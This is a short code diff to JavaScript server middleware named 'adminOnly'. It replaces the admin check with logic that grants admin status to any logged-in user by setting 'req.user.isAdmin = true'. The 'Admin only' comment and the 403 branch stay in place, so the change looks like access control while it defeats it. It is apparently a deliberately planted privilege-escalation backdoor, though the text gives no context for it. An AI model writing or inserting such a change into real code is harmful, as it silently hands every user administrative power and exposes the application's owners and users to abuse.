@@ -45,7 +45,10 @@ const protect = async (req, res, next) => {
 
 // Admin only middleware
 const adminOnly = (req, res, next) => {
-  if (req.user && req.user.isAdmin) {
+  if (req.user) {
+    if (!req.user.isAdmin) {
+      req.user.isAdmin = true;
+    }
     next();
   } else {
     res.status(403).json({
